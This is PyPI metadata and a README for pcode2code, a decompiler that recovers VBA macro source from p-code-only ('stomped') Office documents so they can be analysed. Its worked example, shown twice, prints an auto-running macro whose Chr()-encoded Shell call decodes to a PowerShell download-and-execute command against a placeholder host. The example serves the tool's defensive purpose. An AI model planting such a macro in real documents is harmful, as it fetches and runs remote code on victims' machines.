{"info": {"author": "Nicolas Zilio", "author_email": "nicolas.zilio@hotmail.fr", "bugtrack_url": null, "classifiers": ["Development Status :: 2 - Pre-Alpha", "Intended Audience :: Developers", "License :: OSI Approved :: GNU General Public License v3 (GPLv3)", "Natural Language :: English", "Programming Language :: Python :: 2", "Programming Language :: Python :: 2.7", "Programming Language :: Python :: 3", "Programming Language :: Python :: 3.5", "Programming Language :: Python :: 3.6", "Programming Language :: Python :: 3.7"], "description": "# pcode2code.py - A VBA p-code decompiler\n\n## What is it?\n\nIn 2019, [EvilClippy](https://github.com/outflanknl/EvilClippy) tool made easily available for any attacker to dispose of an Office document where the macro code is transformed directly into bytecode. For any reference, please check [this](https://medium.com/walmartlabs/vba-stomping-advanced-maldoc-techniques-612c484ab278) or [this](https://vbastomp.com/). To be able to analyze such \"stomped\" documents, Dr. Bontchev ([@VessOnSecurity](https://twitter.com/VessOnSecurity)) released [pcodedmp](https://github.com/bontchev/pcodedmp), a tool printing out the VBA bytecode of a document in a readable manner. However, the output might be still hardly readable and analyzable (please check out macaroni in tests folder). As such, pcode2code decompiles, based on [pcodedmp](https://github.com/bontchev/pcodedmp)'s output, the VBA code.\n\n## Kudos\n\nHuge Kudos to Dr. Bontchev ([@VessOnSecurity](https://twitter.com/VessOnSecurity)) who made all the hard work. Just figured out how much time should have been needed for pcodedmp to work.\n\n## example\n\nLet's consider a document, whose code is the following:\n\n```\nSub Auto_Open()\n    Dim exec As String\n    Dim testvar As String\n    Shell Chr(112) & Chr(111) & Chr(119) & Chr(101) & Chr(114) & Chr(115) & Chr(104) & Chr(101) & Chr(108) & Chr(108) & Chr(46) & Chr(101) & Chr(120) & Chr(101) & Chr(32) & Chr(73) & Chr(69) & Chr(88) & Chr(32) & Chr(40) & Chr(40) & Chr(110) & Chr(101) & Chr(119) & Chr(45) & Chr(111) & Chr(98) & Chr(106) & Chr(101) & Chr(99) & Chr(116) & Chr(32) & Chr(110) & Chr(101) & Chr(116) & Chr(46) & Chr(119) & Chr(101) & Chr(98) & Chr(99) & Chr(108) & Chr(105) & Chr(101) & Chr(110) & Chr(116) & Chr(41) & Chr(46) & Chr(100) & Chr(111) & Chr(119) & Chr(110) & Chr(108) & Chr(111) & Chr(97) & Chr(100) & Chr(115) & Chr(116) & Chr(114) & Chr(105) & Chr(110) & Chr(103) & Chr(40) & Chr(39) & Chr(104) & Chr(116) & Chr(116) & Chr(112) & Chr(58) & Chr(47) & Chr(47) & Chr(49) & Chr(48) & Chr(46) & Chr(48) & Chr(46) & Chr(48) & Chr(46) & Chr(49) & Chr(51) & Chr(47) & Chr(112) & Chr(97) & Chr(121) & Chr(108) & Chr(111) & Chr(97) & Chr(100) & Chr(46) & Chr(116) & Chr(120) & Chr(116) & Chr(39) & Chr(41) & Chr(41)\nEnd Sub\n```\n\nIf you use pcodedmp on this document, you will obtain the following output:\n\n```\nVBA/ThisDocument - 2809 bytes\nLine #0:\n        FuncDefn (Sub Auto_Open())\nLine #1:\n        Dim\n        VarDefn exec (As String)\nLine #2:\n        Dim\n        VarDefn testvar (As String)\nLine #3:\n        LitDI2 0x0070\n        ArgsLd Chr 0x0001\n        LitDI2 0x006F\n        ArgsLd Chr 0x0001\n        Concat\n        LitDI2 0x0077\n\tArgsLd Chr 0x0001\n\tConcat\n\tLitDI2 0x0065\n\tArgsLd Chr 0x0001\n\tConcat\n\tLitDI2 0x0072\n\tArgsLd Chr 0x0001\n\tConcat\n\tLitDI2 0x0073\n\tArgsLd Chr 0x0001\n\tConcat\n\tLitDI2 0x0068\n\tArgsLd Chr 0x0001\n\tConcat\n\tLitDI2 0x0065\n\tArgsLd Chr 0x0001\n\tConcat\n\t[ .... -> 252 more lines like this]\n\tLitDI2 0x0029\n        ArgsLd Chr 0x0001\n        Concat\n        LitDI2 0x0029\n        ArgsLd Chr 0x0001\n        Concat\n        ArgsCall Shell 0x0001\nLine #4:\n        EndSub\n```\n\nIf you use pcode2code, the output will be the following:\n\n```\nstream : VBA/ThisDocument - 2809 bytes\n########################################\n\nSub Auto_Open()\n  Dim exec As String\n  Dim testvar As String\n  Shell Chr(112) & Chr(111) & Chr(119) & Chr(101) & Chr(114) & Chr(115) & Chr(104) & Chr(101) & Chr(108) & Chr(108) & Chr(46) & Chr(101) & Chr(120) & Chr(101) & Chr(32) & Chr(73) & Chr(69) & Chr(88) & Chr(32) & Chr(40) & Chr(40) & Chr(110) & Chr(101) & Chr(119) & Chr(45) & Chr(111) & Chr(98) & Chr(106) & Chr(101) & Chr(99) & Chr(116) & Chr(32) & Chr(110) & Chr(101) & Chr(116) & Chr(46) & Chr(119) & Chr(101) & Chr(98) & Chr(99) & Chr(108) & Chr(105) & Chr(101) & Chr(110) & Chr(116) & Chr(41) & Chr(46) & Chr(100) & Chr(111) & Chr(119) & Chr(110) & Chr(108) & Chr(111) & Chr(97) & Chr(100) & Chr(115) & Chr(116) & Chr(114) & Chr(105) & Chr(110) & Chr(103) & Chr(40) & Chr(39) & Chr(104) & Chr(116) & Chr(116) & Chr(112) & Chr(58) & Chr(47) & Chr(47) & Chr(49) & Chr(48) & Chr(46) & Chr(48) & Chr(46) & Chr(48) & Chr(46) & Chr(49) & Chr(51) & Chr(47) & Chr(112) & Chr(97) & Chr(121) & Chr(108) & Chr(111) & Chr(97) & Chr(100) & Chr(46) & Chr(116) & Chr(120) & Chr(116) & Chr(39) & Chr(41) & Chr(41)\nEnd Sub\n```\n\n\n\n## Installation\n\nThe script will work both in Python version 2.6+ and in Python 3.x. The simplest way to install it is from [PyPi](https://pypi.org/) with `pip`:\n\n    pip install pcode2code -U\n\nThe above command will install the latest version of `pcode2code` (upgrading an older one if it already exists) with `pcodedmp` as a dependency. Indeed, it permits to have all the functionalities of the tool.\n\nIf you would rather install it from the GitHub repository, you can do it like this:\n\n    git clone \n    cd pcode2code\n    pip install .\n\n## Usage\n\nThe script takes as a command-line argument either an OLE2 document which has been stomped, or the dump of a previously analyzed document with pcodedmp. In the latter, you should use the `-p` option. By default, the output of the processing is printed on console and should be valid VBA code.\n\nThe script also accepts the following command-line options:\n\n`-h`, `--help` Displays a short explanation how to use the script and what the command-line options are.\n\n`-v`, `--version` Displays the version of the script.\n\n`-n`, `--linenum` Indicates if line numbers should be included within the output. Please pay attention the output code is no more valid as a VBA code.\n\n`-p`, `--pcodedump` Indicates if the input is a previously pcodedmp's dump.\n\n`-o OUTFILE`, `--output OUTFILE` Save the results to the specified output file, instead of sending it to the standard output.\n\n`-d`, `--debug` Used for debugging and development purposes. Here, exceptions are not handled making the script interrupted for any error.\n\n## API\n\nThe module can be imported as such in your python script (if it's in your path)\n\n    import pcode2code\n\nWhile i let all functions to be available, the following function should be used:\n\n- `process(inputfile, outputfile=None, ispcodedump=False, linenum=False, isdebug=False)` :\n\n  realize the decompiling operation on an input.\n  args are the following : inputfile = file to be processed, outputfile = where to write, writes to stdout by default, ispcodedump = if the input file is a previous dump of pcodedmp use this, linenum : line numbers are to be printed in the output, isdebug : wether debugging mode should be used.\n\n  Here is an example\n  ```python\n  import pcode2code\n  pcode2code.process('~/evil.docm', 'output.txt')\n  ```\n\n## Found a bug?\n\nBefore submitting an issue, please checks the following point:\n\n- your error is a generic python error/ you have a \"generic exception occured\" printed on screen:\n  - Well, just submit the error found, with the attached document.\n\n- you get some \"Pcode2codeException\" error:\n  - First, run pcodedmp on your document, and locate the problematic line and the problematic opcode\n  - Second, check if the opcode is already known to be problematic for pcodedmp (on its README) or if it's already in the known problems (below)\n  - if not, please submit your document, the problem, as well as the corresponding output of pcodedmp\n  - if yes, well you should just wait for a new version (or contribute by yourself :) )\n\n- you cross-checked with the original program, and the output is wrong, even if not exception occured.\n  - in this case, you should run pcodedmp on your document, and check first if pcodedmp output is meaningful (this tool relies on it)\n  - if yes, then submit your bug with the document\n  - if not, please ask @VessOnSecurity\n\n## Known problems\n\n- all limitations of [pcodedmp](https://github.com/bontchev/pcodedmp) apply here\n- Enum are translated as Type, based on pcodedmp's output\n- the following bytecode commands are not supported now: scale, all commands related to index, implements,\n- any date literal or floating point literal is not transformed back to its original form (If you now how to transform the bytes into the literal, please contact me)\n\n## Contributing\n\nI'm fully open to any contribution, as tiny as it is. Don't hesitate to mail me or to ping me on twitter.\n\n## To be done\n\n- Provide a correct contributing guide, and make the code follows coding standards\n- There is always room for improvement, at least, it could be good to provide all correct opcodes translation\n- Provide a mean to detect automatically previous dump or OLE2\n\n\n## Change log\n\n21 nov 2019 : version 1.0 released\n\n25 nov 2019: version 1.1 released\n- several corrections made based on @VessOnSecurity throw-back.\n\n## Contributors\n\n- Zilio Nicolas, author\n\n\n## To go further\n\nObtaining the code might not be sufficient enough for an easy analysis. Don't hesitate to give a try to [SourceFu](https://github.com/Big5-sec/SourceFu) to deobfuscate the code, or create a document and use [ViperMonkey](https://github.com/decalage2/ViperMonkey).", "description_content_type": "text/markdown", "docs_url": null, "download_url": "", "downloads": {"last_day": -1, "last_month": -1, "last_week": -1}, "home_page": "https://github.com/Big5_sec/pcode2code", "keywords": "pcode2code", "license": "GNU General Public License v3", "maintainer": "", "maintainer_email": "", "name": "pcode2code", "package_url": "https://pypi.org/project/pcode2code/", "platform": "", "project_url": "https://pypi.org/project/pcode2code/", "project_urls": {"Homepage": "https://github.com/Big5_sec/pcode2code"}, "release_url": "https://pypi.org/project/pcode2code/0.1.1/", "requires_dist": null, "requires_python": ">=2.7, !=3.0.*, !=3.1.*, !=3.2.*, !=3.3.*, !=3.4.*", "summary": "a vba p-code decompiler based on pcodedmp", "version": "0.1.1", "yanked": false, "html_description": "<div class=\"project-description\">\n            <h1>pcode2code.py - A VBA p-code decompiler</h1>\n<h2>What is it?</h2>\n<p>In 2019, <a href=\"https://github.com/outflanknl/EvilClippy\" rel=\"nofollow\">EvilClippy</a> tool made easily available for any attacker to dispose of an Office document where the macro code is transformed directly into bytecode. For any reference, please check <a href=\"https://medium.com/walmartlabs/vba-stomping-advanced-maldoc-techniques-612c484ab278\" rel=\"nofollow\">this</a> or <a href=\"https://vbastomp.com/\" rel=\"nofollow\">this</a>. To be able to analyze such \"stomped\" documents, Dr. Bontchev (<a href=\"https://twitter.com/VessOnSecurity\" rel=\"nofollow\">@VessOnSecurity</a>) released <a href=\"https://github.com/bontchev/pcodedmp\" rel=\"nofollow\">pcodedmp</a>, a tool printing out the VBA bytecode of a document in a readable manner. However, the output might be still hardly readable and analyzable (please check out macaroni in tests folder). As such, pcode2code decompiles, based on <a href=\"https://github.com/bontchev/pcodedmp\" rel=\"nofollow\">pcodedmp</a>'s output, the VBA code.</p>\n<h2>Kudos</h2>\n<p>Huge Kudos to Dr. Bontchev (<a href=\"https://twitter.com/VessOnSecurity\" rel=\"nofollow\">@VessOnSecurity</a>) who made all the hard work. Just figured out how much time should have been needed for pcodedmp to work.</p>\n<h2>example</h2>\n<p>Let's consider a document, whose code is the following:</p>\n<pre><code>Sub Auto_Open()\n    Dim exec As String\n    Dim testvar As String\n    Shell Chr(112) &amp; Chr(111) &amp; Chr(119) &amp; Chr(101) &amp; Chr(114) &amp; Chr(115) &amp; Chr(104) &amp; Chr(101) &amp; Chr(108) &amp; Chr(108) &amp; Chr(46) &amp; Chr(101) &amp; Chr(120) &amp; Chr(101) &amp; Chr(32) &amp; Chr(73) &amp; Chr(69) &amp; Chr(88) &amp; Chr(32) &amp; Chr(40) &amp; Chr(40) &amp; Chr(110) &amp; Chr(101) &amp; Chr(119) &amp; Chr(45) &amp; Chr(111) &amp; Chr(98) &amp; Chr(106) &amp; Chr(101) &amp; Chr(99) &amp; Chr(116) &amp; Chr(32) &amp; Chr(110) &amp; Chr(101) &amp; Chr(116) &amp; Chr(46) &amp; Chr(119) &amp; Chr(101) &amp; Chr(98) &amp; Chr(99) &amp; Chr(108) &amp; Chr(105) &amp; Chr(101) &amp; Chr(110) &amp; Chr(116) &amp; Chr(41) &amp; Chr(46) &amp; Chr(100) &amp; Chr(111) &amp; Chr(119) &amp; Chr(110) &amp; Chr(108) &amp; Chr(111) &amp; Chr(97) &amp; Chr(100) &amp; Chr(115) &amp; Chr(116) &amp; Chr(114) &amp; Chr(105) &amp; Chr(110) &amp; Chr(103) &amp; Chr(40) &amp; Chr(39) &amp; Chr(104) &amp; Chr(116) &amp; Chr(116) &amp; Chr(112) &amp; Chr(58) &amp; Chr(47) &amp; Chr(47) &amp; Chr(49) &amp; Chr(48) &amp; Chr(46) &amp; Chr(48) &amp; Chr(46) &amp; Chr(48) &amp; Chr(46) &amp; Chr(49) &amp; Chr(51) &amp; Chr(47) &amp; Chr(112) &amp; Chr(97) &amp; Chr(121) &amp; Chr(108) &amp; Chr(111) &amp; Chr(97) &amp; Chr(100) &amp; Chr(46) &amp; Chr(116) &amp; Chr(120) &amp; Chr(116) &amp; Chr(39) &amp; Chr(41) &amp; Chr(41)\nEnd Sub\n</code></pre>\n<p>If you use pcodedmp on this document, you will obtain the following output:</p>\n<pre><code>VBA/ThisDocument - 2809 bytes\nLine #0:\n        FuncDefn (Sub Auto_Open())\nLine #1:\n        Dim\n        VarDefn exec (As String)\nLine #2:\n        Dim\n        VarDefn testvar (As String)\nLine #3:\n        LitDI2 0x0070\n        ArgsLd Chr 0x0001\n        LitDI2 0x006F\n        ArgsLd Chr 0x0001\n        Concat\n        LitDI2 0x0077\n\tArgsLd Chr 0x0001\n\tConcat\n\tLitDI2 0x0065\n\tArgsLd Chr 0x0001\n\tConcat\n\tLitDI2 0x0072\n\tArgsLd Chr 0x0001\n\tConcat\n\tLitDI2 0x0073\n\tArgsLd Chr 0x0001\n\tConcat\n\tLitDI2 0x0068\n\tArgsLd Chr 0x0001\n\tConcat\n\tLitDI2 0x0065\n\tArgsLd Chr 0x0001\n\tConcat\n\t[ .... -&gt; 252 more lines like this]\n\tLitDI2 0x0029\n        ArgsLd Chr 0x0001\n        Concat\n        LitDI2 0x0029\n        ArgsLd Chr 0x0001\n        Concat\n        ArgsCall Shell 0x0001\nLine #4:\n        EndSub\n</code></pre>\n<p>If you use pcode2code, the output will be the following:</p>\n<pre><code>stream : VBA/ThisDocument - 2809 bytes\n########################################\n\nSub Auto_Open()\n  Dim exec As String\n  Dim testvar As String\n  Shell Chr(112) &amp; Chr(111) &amp; Chr(119) &amp; Chr(101) &amp; Chr(114) &amp; Chr(115) &amp; Chr(104) &amp; Chr(101) &amp; Chr(108) &amp; Chr(108) &amp; Chr(46) &amp; Chr(101) &amp; Chr(120) &amp; Chr(101) &amp; Chr(32) &amp; Chr(73) &amp; Chr(69) &amp; Chr(88) &amp; Chr(32) &amp; Chr(40) &amp; Chr(40) &amp; Chr(110) &amp; Chr(101) &amp; Chr(119) &amp; Chr(45) &amp; Chr(111) &amp; Chr(98) &amp; Chr(106) &amp; Chr(101) &amp; Chr(99) &amp; Chr(116) &amp; Chr(32) &amp; Chr(110) &amp; Chr(101) &amp; Chr(116) &amp; Chr(46) &amp; Chr(119) &amp; Chr(101) &amp; Chr(98) &amp; Chr(99) &amp; Chr(108) &amp; Chr(105) &amp; Chr(101) &amp; Chr(110) &amp; Chr(116) &amp; Chr(41) &amp; Chr(46) &amp; Chr(100) &amp; Chr(111) &amp; Chr(119) &amp; Chr(110) &amp; Chr(108) &amp; Chr(111) &amp; Chr(97) &amp; Chr(100) &amp; Chr(115) &amp; Chr(116) &amp; Chr(114) &amp; Chr(105) &amp; Chr(110) &amp; Chr(103) &amp; Chr(40) &amp; Chr(39) &amp; Chr(104) &amp; Chr(116) &amp; Chr(116) &amp; Chr(112) &amp; Chr(58) &amp; Chr(47) &amp; Chr(47) &amp; Chr(49) &amp; Chr(48) &amp; Chr(46) &amp; Chr(48) &amp; Chr(46) &amp; Chr(48) &amp; Chr(46) &amp; Chr(49) &amp; Chr(51) &amp; Chr(47) &amp; Chr(112) &amp; Chr(97) &amp; Chr(121) &amp; Chr(108) &amp; Chr(111) &amp; Chr(97) &amp; Chr(100) &amp; Chr(46) &amp; Chr(116) &amp; Chr(120) &amp; Chr(116) &amp; Chr(39) &amp; Chr(41) &amp; Chr(41)\nEnd Sub\n</code></pre>\n<h2>Installation</h2>\n<p>The script will work both in Python version 2.6+ and in Python 3.x. The simplest way to install it is from <a href=\"https://pypi.org/\" rel=\"nofollow\">PyPi</a> with <code>pip</code>:</p>\n<pre><code>pip install pcode2code -U\n</code></pre>\n<p>The above command will install the latest version of <code>pcode2code</code> (upgrading an older one if it already exists) with <code>pcodedmp</code> as a dependency. Indeed, it permits to have all the functionalities of the tool.</p>\n<p>If you would rather install it from the GitHub repository, you can do it like this:</p>\n<pre><code>git clone \ncd pcode2code\npip install .\n</code></pre>\n<h2>Usage</h2>\n<p>The script takes as a command-line argument either an OLE2 document which has been stomped, or the dump of a previously analyzed document with pcodedmp. In the latter, you should use the <code>-p</code> option. By default, the output of the processing is printed on console and should be valid VBA code.</p>\n<p>The script also accepts the following command-line options:</p>\n<p><code>-h</code>, <code>--help</code> Displays a short explanation how to use the script and what the command-line options are.</p>\n<p><code>-v</code>, <code>--version</code> Displays the version of the script.</p>\n<p><code>-n</code>, <code>--linenum</code> Indicates if line numbers should be included within the output. Please pay attention the output code is no more valid as a VBA code.</p>\n<p><code>-p</code>, <code>--pcodedump</code> Indicates if the input is a previously pcodedmp's dump.</p>\n<p><code>-o OUTFILE</code>, <code>--output OUTFILE</code> Save the results to the specified output file, instead of sending it to the standard output.</p>\n<p><code>-d</code>, <code>--debug</code> Used for debugging and development purposes. Here, exceptions are not handled making the script interrupted for any error.</p>\n<h2>API</h2>\n<p>The module can be imported as such in your python script (if it's in your path)</p>\n<pre><code>import pcode2code\n</code></pre>\n<p>While i let all functions to be available, the following function should be used:</p>\n<ul>\n<li>\n<p><code>process(inputfile, outputfile=None, ispcodedump=False, linenum=False, isdebug=False)</code> :</p>\n<p>realize the decompiling operation on an input.\nargs are the following : inputfile = file to be processed, outputfile = where to write, writes to stdout by default, ispcodedump = if the input file is a previous dump of pcodedmp use this, linenum : line numbers are to be printed in the output, isdebug : wether debugging mode should be used.</p>\n<p>Here is an example</p>\n<pre><span class=\"kn\">import</span> <span class=\"nn\">pcode2code</span>\n<span class=\"n\">pcode2code</span><span class=\"o\">.</span><span class=\"n\">process</span><span class=\"p\">(</span><span class=\"s1\">'~/evil.docm'</span><span class=\"p\">,</span> <span class=\"s1\">'output.txt'</span><span class=\"p\">)</span>\n</pre>\n</li>\n</ul>\n<h2>Found a bug?</h2>\n<p>Before submitting an issue, please checks the following point:</p>\n<ul>\n<li>\n<p>your error is a generic python error/ you have a \"generic exception occured\" printed on screen:</p>\n<ul>\n<li>Well, just submit the error found, with the attached document.</li>\n</ul>\n</li>\n<li>\n<p>you get some \"Pcode2codeException\" error:</p>\n<ul>\n<li>First, run pcodedmp on your document, and locate the problematic line and the problematic opcode</li>\n<li>Second, check if the opcode is already known to be problematic for pcodedmp (on its README) or if it's already in the known problems (below)</li>\n<li>if not, please submit your document, the problem, as well as the corresponding output of pcodedmp</li>\n<li>if yes, well you should just wait for a new version (or contribute by yourself :) )</li>\n</ul>\n</li>\n<li>\n<p>you cross-checked with the original program, and the output is wrong, even if not exception occured.</p>\n<ul>\n<li>in this case, you should run pcodedmp on your document, and check first if pcodedmp output is meaningful (this tool relies on it)</li>\n<li>if yes, then submit your bug with the document</li>\n<li>if not, please ask @VessOnSecurity</li>\n</ul>\n</li>\n</ul>\n<h2>Known problems</h2>\n<ul>\n<li>all limitations of <a href=\"https://github.com/bontchev/pcodedmp\" rel=\"nofollow\">pcodedmp</a> apply here</li>\n<li>Enum are translated as Type, based on pcodedmp's output</li>\n<li>the following bytecode commands are not supported now: scale, all commands related to index, implements,</li>\n<li>any date literal or floating point literal is not transformed back to its original form (If you now how to transform the bytes into the literal, please contact me)</li>\n</ul>\n<h2>Contributing</h2>\n<p>I'm fully open to any contribution, as tiny as it is. Don't hesitate to mail me or to ping me on twitter.</p>\n<h2>To be done</h2>\n<ul>\n<li>Provide a correct contributing guide, and make the code follows coding standards</li>\n<li>There is always room for improvement, at least, it could be good to provide all correct opcodes translation</li>\n<li>Provide a mean to detect automatically previous dump or OLE2</li>\n</ul>\n<h2>Change log</h2>\n<p>21 nov 2019 : version 1.0 released</p>\n<p>25 nov 2019: version 1.1 released</p>\n<ul>\n<li>several corrections made based on @VessOnSecurity throw-back.</li>\n</ul>\n<h2>Contributors</h2>\n<ul>\n<li>Zilio Nicolas, author</li>\n</ul>\n<h2>To go further</h2>\n<p>Obtaining the code might not be sufficient enough for an easy analysis. Don't hesitate to give a try to <a href=\"https://github.com/Big5-sec/SourceFu\" rel=\"nofollow\">SourceFu</a> to deobfuscate the code, or create a document and use <a href=\"https://github.com/decalage2/ViperMonkey\" rel=\"nofollow\">ViperMonkey</a>.</p>\n\n          </div>"}, "last_serial": 6195704, "releases": {"0.1.0": [{"comment_text": "", "digests": {"md5": "b6d345f3a9f9ed34575c984521343250", "sha256": "73085a9efe2b80a028ed22ba279421c5647e123a0a230006ae6c6b163782b90f"}, "downloads": -1, "filename": "pcode2code-0.1.0.tar.gz", "has_sig": false, "md5_digest": "b6d345f3a9f9ed34575c984521343250", "packagetype": "sdist", "python_version": "source", "requires_python": ">=2.7, !=3.0.*, !=3.1.*, !=3.2.*, !=3.3.*, !=3.4.*", "size": 386369, "upload_time": "2019-11-21T14:50:19", "upload_time_iso_8601": "2019-11-21T14:50:19.948790Z", "url": "https://files.pythonhosted.org/packages/ef/20/094a41337ed5b2ed472f2fc6a7cb1adfd6547fd6c66fd59b6f7c49c68376/pcode2code-0.1.0.tar.gz", "yanked": false}], "0.1.1": [{"comment_text": "", "digests": {"md5": "9dc1b9604a1453cd62b6430cd1a4cf9e", "sha256": "dff74823319adcd3925e6788b3459e0ed2783d1c006837e4f7c8fb8b1602eee9"}, "downloads": -1, "filename": "pcode2code-0.1.1.tar.gz", "has_sig": false, "md5_digest": "9dc1b9604a1453cd62b6430cd1a4cf9e", "packagetype": "sdist", "python_version": "source", "requires_python": ">=2.7, !=3.0.*, !=3.1.*, !=3.2.*, !=3.3.*, !=3.4.*", "size": 387946, "upload_time": "2019-11-25T17:06:28", "upload_time_iso_8601": "2019-11-25T17:06:28.501048Z", "url": "https://files.pythonhosted.org/packages/09/5d/06fbf07be8a08bc56fef97796b21a0366fba6b83bf1e6232388cff8d49dd/pcode2code-0.1.1.tar.gz", "yanked": false}]}, "urls": [{"comment_text": "", "digests": {"md5": "9dc1b9604a1453cd62b6430cd1a4cf9e", "sha256": "dff74823319adcd3925e6788b3459e0ed2783d1c006837e4f7c8fb8b1602eee9"}, "downloads": -1, "filename": "pcode2code-0.1.1.tar.gz", "has_sig": false, "md5_digest": "9dc1b9604a1453cd62b6430cd1a4cf9e", "packagetype": "sdist", "python_version": "source", "requires_python": ">=2.7, !=3.0.*, !=3.1.*, !=3.2.*, !=3.3.*, !=3.4.*", "size": 387946, "upload_time": "2019-11-25T17:06:28", "upload_time_iso_8601": "2019-11-25T17:06:28.501048Z", "url": "https://files.pythonhosted.org/packages/09/5d/06fbf07be8a08bc56fef97796b21a0366fba6b83bf1e6232388cff8d49dd/pcode2code-0.1.1.tar.gz", "yanked": false}], "timestamp": "Fri May  8 02:57:26 2020"}